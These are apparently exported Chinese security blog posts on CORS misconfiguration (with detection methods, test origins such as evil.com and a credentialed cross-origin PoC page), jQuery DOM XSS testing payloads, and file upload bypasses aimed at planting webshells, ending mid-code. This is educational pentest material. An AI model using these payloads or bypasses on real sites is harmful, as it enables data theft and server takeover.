<p>　　为了在有SOP的情况下实现跨域通信，开发人员必须使用不同的技术绕过SOP来传递数据。此时，“绕过”既是一个正常的技术问题，又是一个敏感的安全问题。为了在不影响应用安全状态的情况下实现信息共享，HTML5中引入了跨域资源共享（CORS）。但是，很多开发者在使用时没有考虑到其中蕴含安全风险，容易出现配置错误，导致出现安全漏洞。</p>
<p> 　　跨域资源共享（CORS）是一种网络机制，使Web浏览器在受控的情况下通过xmlHttpRequest API执行跨域请求。这些跨域请求具有Origin标头，用于标识发起请求的域。它定义了在Web浏览器和服务器之间使用的协议，以确定是否允许跨域请求。</p>
<h2 id="关键的CORS-header"><a href="#关键的CORS-header" class="headerlink" title="关键的CORS header"></a>关键的CORS header</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://www.baidu1.com</span><br></pre></td></tr></table></figure>

<p>指定哪些域可以访问本域的资源。例如，如果baidu1.com想要访问baidu.com的资源，那么开发人员可以用此授予baidu1.com访问baidu.com资源的权限。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送cookie。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET</span><br></pre></td></tr></table></figure>

<p>指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。开发人员可用其进一步加强控制力，增强安全性。</p>
<h2 id="CORS-基本用法"><a href="#CORS-基本用法" class="headerlink" title="CORS 基本用法"></a>CORS 基本用法</h2><p>　　当 b.com 服务器想要与 a.com 共享资源内容时，它只需要在 HTTP 响应中添加如下响应头。这个响应头告诉浏览器放宽 SOP 限制，允许a.com脚本读取响应内容：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://a.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>



<p>a.com 则可以通过以下Javascript 脚本，跨域读取 b.com 服务器的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">	<span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123; </span><br><span class="line">		alert(xhr.responseText); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://b.com/api&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>



<h2 id="常见的错误配置"><a href="#常见的错误配置" class="headerlink" title="常见的错误配置"></a>常见的错误配置</h2><h3 id="Origin-与-Credentials-true-共用"><a href="#Origin-与-Credentials-true-共用" class="headerlink" title="Origin:*与 Credentials:true 共用"></a>Origin:*与 Credentials:true 共用</h3><p>有一些偷懒的程序员，将Access-Control-Allow-Origin设置为允许来自所有域<code>*</code>的跨域请求，实例如下:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /api/index.php</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.baidu.com</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>www.baidu.com</span><br></pre></td></tr></table></figure>

<p>当发送上述请求时，将获得具有Access-Control-Allow-Origin标头设置的响应</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>　　这意味着该站点允许访问来自所有站点的资源，考虑到这种权限过于宽松，CORS又规定，<code>Access-Control-Allow-Origin:*</code>与 <code>Access-Control-Allow-Credentials:true</code> 不能同时使用。所以这种配置是错误的，浏览器不允许这两种配置同时出现，这种配置只能用于共享公开资源。(对于共享公开资源，不应该需要身份认证)，浏览器会对这种误配置报错，所以该配置不能作为漏洞进行利用。</p>
<h3 id="反射-Origin头"><a href="#反射-Origin头" class="headerlink" title="反射 Origin头"></a>反射 Origin头</h3><p>　　根据前面的 CORS基本用法，开发者可以很容易实现与其它单个网站共享数据。假如一个开发者想要与多个网站共享数据，应该如何配置CORS呢？也许直觉告诉你应该如下配置：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://a.com, http://c.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://*.a.com</span><br></pre></td></tr></table></figure>

<p>　　但事实上这两种域名配置是错误的，因为CORS标准规定，<code>Access-Control-Allow-Origin</code>只能配置为单个origin, null或*。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度，导致实际网络中出现各种不安全的误配置。</p>
<p>　　最简单地动态生成访问控制策略的方法，就是在<code>Access-Control-Allow-Origin</code>中反射请求的Origin值。例如，下面是一个错误 Nginx 配置示例：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> <span class="string">&quot;Access-Control-Allow-Origin&quot;</span> $http_origin;</span><br><span class="line"><span class="attribute">add_header</span> “Access-Control-Allow-Credentials” “<span class="literal">true</span>”;</span><br></pre></td></tr></table></figure>

<p>　　这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。</p>
<h3 id="Origin-校验错误"><a href="#Origin-校验错误" class="headerlink" title="Origin 校验错误"></a>Origin 校验错误</h3><p>　　由于前面那种反射 Origin 的做法过于宽松，另一些开发人员试图在生成访问控制策略时校验Origin头，我们发现这个校验过程实际中也出现许多错误。这些错误可以分为四类：</p>
<p><strong>前缀匹配</strong>: 资源服务器在检查请求中Origin值时，只匹配了前缀。例如<code>www.example.com</code> 想要允许<code>example.com</code>访问，但是只做了前缀匹配，导致同时信任了<code>example.com.attack.com</code>的访问，而<code>example.com.attack.com</code> 是攻击者可以控制的网站。</p>
<p><strong>后缀匹配</strong>: 资源服务器在检查请求中Origin值时，只做了后缀匹配。例如<code>www.example.com</code> 想要允许<code>example.com</code>访问，由于后缀匹配出错，导致允许<code>attackexample.com</code>访问。</p>
<p><strong>没有转义’.’</strong>: 例如，<code>example.com</code>想要允许<code>www.example.com</code> 访问时，但正则匹配没有转义’.’，导致允许<code>wwwaexample.com</code>访问。</p>
<p><strong>包含匹配</strong>: 我们还发现有的网站<code>www.example.com</code> 想要允许 <code>example.com</code>，但是Origin校验出错，出现允许<code>ample.com</code>访问。</p>
<h3 id="信任null"><a href="#信任null" class="headerlink" title="信任null"></a>信任null</h3><p>　　CORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在<code>RFC 6564</code>中被定义。<code>RFC 6564</code>规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。</p>
<p>　　CORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>　　但是事实上，除了本地file页面的跨域请求Origin头为null外，攻击者还可以从任意域下通过<code>iframe sandbox</code>构造Origin为null的跨域请求，如下是一段示意代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html,&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"></span></span></span><br><span class="line"><span class="string"><span class="tag">var xhr=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.onreadystatechange = function() &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">if (xhr.readyState == XMLHttpRequest.DONE) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">	alert(xhr.responseText);</span></span></span><br><span class="line"><span class="string"><span class="tag">	&#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.open(&quot;GET&quot;, &quot;http://www.test.com/a.php&quot;, true);</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.withCredentials = true;</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.send();&lt;/script&gt;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>　　这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials:true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
<h3 id="HTTPS域信任HTTP域"><a href="#HTTPS域信任HTTP域" class="headerlink" title="HTTPS域信任HTTP域"></a>HTTPS域信任HTTP域</h3><p>　　HTTPS协议被设计用于在不安全的中间网络中进行安全通信。即使在中间人网络环境下，攻击者也应该无法读取HTTPS网站的内容。但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容。</p>
<h3 id="信任自身全部子域"><a href="#信任自身全部子域" class="headerlink" title="信任自身全部子域"></a>信任自身全部子域</h3><p>　　很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS的危害被强化。为了防止某个子域上XSS漏洞的危害其他子域，浏览器设计了Cookie的<code>httponly</code>标志，用于限制Javascript读取Cookie，因此某个子域XSS不能读取带有<code>httponly</code>标记的Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了CORS且信任全部子域，那么攻击者可以利用其他任意子域上XSS漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。</p>
<h3 id="缺少-Vary-Origin头"><a href="#缺少-Vary-Origin头" class="headerlink" title="缺少 Vary:Origin头"></a>缺少 Vary:Origin头</h3><p>　　当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，<code>c.com</code>同时允许<code>a.com</code>和<code>b.com</code>共享。<code>c.com</code> 资源内容首先被<code>a.com</code> 脚本跨域访问后被缓存，其中缓存响应头为<code>Access-Control-Allow-Origin: http://a.com”</code>。这时，b.com脚本则不能读取缓存响应内容，因为缓存响应头是允许<code>a.com</code>共享，而不是<code>b.com</code>。</p>
<p>　　HTTP协议提供了Vary头，用于解决这种情况，资源服务器需要在响应头中配置<code>Vary:Origin</code>头来指导缓存，为每个不同的Origin头缓存一份不同的内容。</p>
<h2 id="CORS-漏洞发现"><a href="#CORS-漏洞发现" class="headerlink" title="CORS 漏洞发现"></a>CORS 漏洞发现</h2><p>使用curl工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I https://www.a.com -H &quot;Origin: https://test.com&quot;</span><br></pre></td></tr></table></figure>

<p>burp suite抓包修改头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET https://www.a.com/api/index.php</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.test.com</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>www.test.com</span><br></pre></td></tr></table></figure>

<p>CORScanner批量检测工具</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://github.com/chenjj/CORScanner</span><br></pre></td></tr></table></figure>

<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cors_scan.py -vv -u https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>　　通过分析工具源码，可以知道其检测漏洞的逻辑，发现其为变换请求头的origin字段，如果返回包中的<code>access-control-allow-origin</code>内容和发送的origin头内容相同，则存在此问题。</p>
<p>以检测<code>http://www.vuln.com/a.php</code>为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射Origin头</span><br><span class="line">发送origin头为http://evil.com</span><br><span class="line"></span><br><span class="line">是否只匹配前置域名</span><br><span class="line">发送origin头为http://www.vuln.com.evil.com</span><br><span class="line"></span><br><span class="line">是否只匹配后置域名</span><br><span class="line">发送origin头为http://evilvuln.com</span><br><span class="line"></span><br><span class="line">是否信任null</span><br><span class="line">发送origin头为null</span><br><span class="line"></span><br><span class="line">是否包含匹配</span><br><span class="line">发送origin头为http://uln.com</span><br><span class="line"></span><br><span class="line">是否没有转义.</span><br><span class="line">http://www.vulnacom</span><br><span class="line"></span><br><span class="line">是否信任自定义url        </span><br><span class="line">发送的origin位于根目录下的origins.json</span><br><span class="line">https://whatever.github.io</span><br><span class="line">http://jsbin.com</span><br><span class="line">htps://codepen.io</span><br><span class="line">https://jsfiddle.net</span><br><span class="line">http://www.webdevout.net</span><br><span class="line">https://repl.it</span><br><span class="line"></span><br><span class="line">是否信任任意子域名</span><br><span class="line">http://evil.www.vuln.com</span><br><span class="line"></span><br><span class="line">https是否信任http（此检测为http，故忽略）</span><br><span class="line">origin为将https替换为http</span><br></pre></td></tr></table></figure>

<p>　　但是发现了一个问题，就是其没有解析泛域名的问题，也就是配置了<code>access-control-allow-origin</code>为*的安全问题，虽然这个配置不能被漏洞所利用</p>
<p>这份源码加上了这个功能</p>
<p><a href="https://github.com/saucer-man/CORScanner">https://github.com/saucer-man/CORScanner</a></p>
<p><a href="https://github.com/saucer-man/CORScanner/commit/3af8499c8860e203f1d3264f287c19d047fafd93">https://github.com/saucer-man/CORScanner/commit/3af8499c8860e203f1d3264f287c19d047fafd93</a></p>
<h2 id="CORS-漏洞利用POC"><a href="#CORS-漏洞利用POC" class="headerlink" title="CORS 漏洞利用POC"></a>CORS 漏洞利用POC</h2><p>当A网站设置<code>Access-Control-Allow-Origin: null</code>的时候，B站能够读取A站的敏感数据。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC Exploit<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Extract SID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;cors()&quot;</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">	xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = alert(<span class="built_in">this</span>.responseText);</span></span><br><span class="line"><span class="javascript">		&#125;</span></span><br><span class="line"><span class="javascript">	&#125;;</span></span><br><span class="line"><span class="javascript">	xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://target.com/info/&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">	xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">	xhttp.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="CORS-漏洞防御措施"><a href="#CORS-漏洞防御措施" class="headerlink" title="CORS 漏洞防御措施"></a>CORS 漏洞防御措施</h2><ol>
<li><p>不要盲目反射 Origin头</p>
</li>
<li><p>严格校验 Origin 头，避免出现权限泄露</p>
</li>
<li><p>不要配置 <code>Access-Control-Allow-Origin: null</code></p>
</li>
<li><p>HTTPS 网站不要信任HTTP 域</p>
</li>
<li><p>不要信任全部自身子域，减少攻击面</p>
</li>
<li><p>不要配置 <code>Origin:*</code>和 <code>Credentials: true</code></p>
</li>
<li><p>增加 <code>Vary: Origin</code> 头</p>
</li>
</ol>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2-6-origin-%E4%B8%8E-credentials-true-%E5%85%B1%E7%94%A8">绕过浏览器SOP，跨站窃取信息：CORS配置安全漏洞报告及最佳部署实践</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/83099266">CORS介绍及其漏洞检测</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>CORS</category>
      </categories>
      <tags>
        <tag>跨域漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery库版本过低</title>
    <url>//c7d50197fdce.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="jQuery简介"><a href="#jQuery简介" class="headerlink" title="jQuery简介"></a>jQuery简介</h2><p>　　jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。jQuery设计的目的是为了写更少的代码，做更多的事情。它封装JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
<p>　　在JQuery的诸多发行版本中，存在着DOM-based XSS（跨站脚本攻击的一种)漏洞，易被攻击者利用。漏洞原因在于过滤用户输入数据所使用的正则表达式存在缺陷，可能导致LOCATION.HASH跨站漏洞。这也是最为被大众熟知的jQuery的一个漏洞。</p>
<h2 id="DOM-based-XSS-漏洞"><a href="#DOM-based-XSS-漏洞" class="headerlink" title="DOM-based XSS 漏洞"></a>DOM-based XSS 漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li><p> jquery-1.7.1~1.8.3</p>
</li>
<li><p> jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p>
</li>
<li><p> jquery-1.5所有版本</p>
</li>
<li><p> jquery-1.4所有版本</p>
</li>
<li><p> jquery-1.3所有版本</p>
</li>
<li><p> jquery-1.2所有版本</p>
</li>
</ul>
<p>影响版本不全面，建议升级到jquery-3.4.0以上</p>
<h2 id="漏洞测试方法"><a href="#漏洞测试方法" class="headerlink" title="漏洞测试方法"></a>漏洞测试方法</h2><p>F12打开Console窗口，输入以下代码显示jquery版本号</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.fn.jquery</span><br></pre></td></tr></table></figure>

<p>输入以下代码,如果有弹窗出现说明存在XSS漏洞</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;element[attribute=&#x27;&lt;img src=123123 οnerrοr=alert(123)&gt;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>升级jQuery库到jquery-3.4.0以上或者最新版本</p>
<p>更新版本有可能存在众多问题，所以在不改变版本的情况下避免漏洞的利用（或者使用插件jQuery Migrate）</p>
<h3 id="临时修复方案"><a href="#临时修复方案" class="headerlink" title="临时修复方案"></a>临时修复方案</h3><ul>
<li><p> jquery文件重命名</p>
</li>
<li><p>把jquery文件里头部带有版本号的注释删除</p>
</li>
<li><p>把jquery文件内版本号清除（不推荐）</p>
</li>
<li><p> 在 jquery文件中重写版本号</p>
</li>
</ul>
<p>一部分调用的插件失效了，所以在这里是重写jquery版本而不是清除jquery版本</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gqat654fwcj30dz02nmx4.jpg" alt="jQuery库版本过低.png"></p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="http://research.insecurelabs.org/jquery/test/">JQuery跨站脚本在线测试</a></p>
<p><a href="https://blog.csdn.net/kang1011/article/details/109682718?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-3-109682718&spm=3001.4430">解决jquery版本过低引发的XSS跨站安全漏洞</a></p>
<p><a href="https://blog.csdn.net/adminhui/article/details/103035516?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-4-103035516&spm=3001.4430">jquery版本安全漏洞问题</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>其他漏洞</category>
      </categories>
      <tags>
        <tag>跨域漏洞</tag>
        <tag>第三方库漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>//0053789dab3b.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>　　文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件</p>
<h2 id="文件上传漏洞条件"><a href="#文件上传漏洞条件" class="headerlink" title="文件上传漏洞条件"></a>文件上传漏洞条件</h2><ul>
<li>上传的文件可以被web服务器当作脚本来执行</li>
<li>我们可以访问上传文件的路径</li>
</ul>
<h2 id="服务器上传文件命名规则"><a href="#服务器上传文件命名规则" class="headerlink" title="服务器上传文件命名规则"></a>服务器上传文件命名规则</h2><ul>
<li>第一种：上传文件名和服务器命名一致</li>
<li>第二种：上传文件名和服务器命名不一致（随机，时间日期命名等），但是后缀一致</li>
<li>第三种：上传文件名和服务器命名不一致（随机，时间日期命名等），后缀不一致</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>　　由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件。打个比方来说，如果你使用 php 作为服务器端的脚本语言，那么在你网站的上传功能处，就一定不能让用户上传 php 类型的文件，否则他上传一个木马文件，你服务器就被他控制了。因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p>
<p>一般我们会利用文件上传漏洞上传一句话木马，然后用工具连接获取 webshell。</p>
<p>但是这里有两个问题：</p>
<ul>
<li>第一你的文件能上传到web服务器，并且知道上传的路径</li>
<li>第二你的文件能被当成脚本文件执行，所以要想让上传文件被当成脚本执行，我们经常会和文件包含漏洞和文件解析漏洞一起利用</li>
</ul>
<h1 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h1><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="JS前端脚本检查"><a href="#JS前端脚本检查" class="headerlink" title="JS前端脚本检查"></a>JS前端脚本检查</h3><p>　　前端检测文件扩展名。当客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，前端的 js 脚本就对文件的扩展名进行检测来判断是否是可以上传的类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<ol>
<li>直接禁用JavaScript实现绕过</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxttva6j30mn01rq2t.jpg"></p>
<ol start="2">
<li>先把文件扩展名改成允许上传的文件类型，再利用burp suite抓包改成自己想要的文件类型，即可绕过</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtwi0xj30le04xjsh.jpg"></p>
<p>找到上传地址</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtxuonj30g3038jrp.jpg"></p>
<p>用工具链接即可</p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h3><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span 